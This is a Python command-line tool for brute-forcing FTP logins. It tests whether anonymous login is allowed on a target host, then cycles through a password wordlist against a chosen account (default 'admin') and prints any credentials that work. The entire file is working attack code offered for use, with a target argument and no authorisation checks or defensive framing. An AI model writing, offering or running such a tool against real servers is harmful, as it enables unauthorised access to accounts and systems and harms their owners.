import ftplib
import sys
import argparse
import time
from typing import Optional, List
from pathlib import Path


class FTPBruteForcer:
    """FTP brute force tool with improved error handling and resource management."""
    
    def __init__(self, host: str, username: str, timeout: int = 5, delay: float = 0.5):
        self.host = host
        self.username = username
        self.timeout = timeout
        self.delay = delay
        self.attempts = 0
    
    def _connect(self, user: str, password: str) -> Optional[bool]:
        """
        Attempt to connect and login to FTP server.
        
        Returns:
            True if login successful
            False if login failed (wrong credentials)
            None if connection error occurred
        """
        ftp = None
        try:
            ftp = ftplib.FTP()
            ftp.connect(self.host, timeout=self.timeout)
            ftp.login(user=user, passwd=password)
            return True
        except ftplib.error_perm:
            # Authentication failed - wrong credentials
            return False
        except (ftplib.error_temp, ftplib.error_reply, ftplib.error_proto) as e:
            # Temporary errors or protocol errors
            return None
        except (ConnectionRefusedError, TimeoutError, OSError) as e:
            # Network/connection errors
            return None
        except Exception as e:
            # Unexpected errors
            return None
        finally:
            if ftp:
                try:
                    ftp.quit()
                except:
                    try:
                        ftp.close()
                    except:
                        pass
    
    def check_anonymous_login(self) -> bool:
        """Check if anonymous login is enabled."""
        result = self._connect('anonymous', '')
        if result:
            print(f"[+] FTP Anonymous login succeeded on host: {self.host}")
            return True
        else:
            print(f"[-] FTP Anonymous login failed on host: {self.host}")
            return False
    
    def load_wordlist(self, wordlist_path: str) -> List[str]:
        """
        Load passwords from wordlist file.
        
        Raises:
            FileNotFoundError: If wordlist file doesn't exist
            IOError: If file cannot be read
        """
        wordlist_file = Path(wordlist_path)
        
        if not wordlist_file.exists():
            raise FileNotFoundError(f"Wordlist file not found: {wordlist_path}")
        
        if not wordlist_file.is_file():
            raise ValueError(f"Path is not a file: {wordlist_path}")
        
        try:
            with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            
            if not passwords:
                raise ValueError(f"Wordlist file is empty: {wordlist_path}")
            
            return passwords
        except IOError as e:
            raise IOError(f"Error reading wordlist file: {e}")
    
    def brute_force(self, passwords: List[str]) -> Optional[str]:
        """
        Attempt brute force attack with given password list.
        
        Returns:
            Successful password if found, None otherwise
        """
        total = len(passwords)
        print(f"[+] Starting brute force: {total} passwords to test")
        
        for idx, password in enumerate(passwords, 1):
            self.attempts += 1
            print(f"[*] [{idx}/{total}] Testing password: {password}")
            
            result = self._connect(self.username, password)
            
            if result is True:
                print(f"[+] SUCCESS! Username: {self.username} | Password: {password}")
                return password
            elif result is None:
                print(f"[!] Connection issue with host: {self.host}. Continuing...")
            
            # Delay between attempts
            if idx < total:  # Don't delay after last attempt
                time.sleep(self.delay)
        
        return None


def parse_arguments():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        description='FTP BruteForcer - Test FTP credentials against a target host',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument(
        '--host',
        required=True,
        help='FTP host to target (IP address or hostname)'
    )
    parser.add_argument(
        '-u', '--username',
        default='admin',
        help='Username to test (default: admin)'
    )
    parser.add_argument(
        '-w', '--wordlist',
        default='passwords.txt',
        help='Path to password wordlist file (default: passwords.txt)'
    )
    parser.add_argument(
        '-t', '--timeout',
        type=int,
        default=5,
        help='Connection timeout in seconds (default: 5)'
    )
    parser.add_argument(
        '-d', '--delay',
        type=float,
        default=0.5,
        help='Delay between attempts in seconds (default: 0.5)'
    )
    parser.add_argument(
        '--skip-anonymous',
        action='store_true',
        help='Skip anonymous login check'
    )
    
    return parser.parse_args()


def main():
    """Main entry point."""
    args = parse_arguments()
    
    # Validate arguments
    if args.timeout <= 0:
        print("[-] Error: Timeout must be greater than 0")
        sys.exit(1)
    
    if args.delay < 0:
        print("[-] Error: Delay cannot be negative")
        sys.exit(1)
    
    # Initialize brute forcer
    brute_forcer = FTPBruteForcer(
        host=args.host,
        username=args.username,
        timeout=args.timeout,
        delay=args.delay
    )
    
    print(f"[+] Target: {args.host}")
    print(f"[+] Username: {args.username}")
    print(f"[+] Wordlist: {args.wordlist}")
    print(f"[+] Timeout: {args.timeout}s | Delay: {args.delay}s")
    print("-" * 50)
    
    # Check anonymous login (unless skipped)
    if not args.skip_anonymous:
        if brute_forcer.check_anonymous_login():
            sys.exit(0)
        print("-" * 50)
    
    # Load wordlist
    try:
        passwords = brute_forcer.load_wordlist(args.wordlist)
        print(f"[+] Loaded {len(passwords)} passwords from wordlist")
    except (FileNotFoundError, ValueError, IOError) as e:
        print(f"[-] Error: {e}")
        sys.exit(1)
    
    print("-" * 50)
    
    # Perform brute force
    result = brute_forcer.brute_force(passwords)
    
    if result:
        sys.exit(0)
    else:
        print(f"[-] Brute force completed. No valid credentials found after {brute_forcer.attempts} attempts.")
        sys.exit(1)


if __name__ == "__main__":
    main()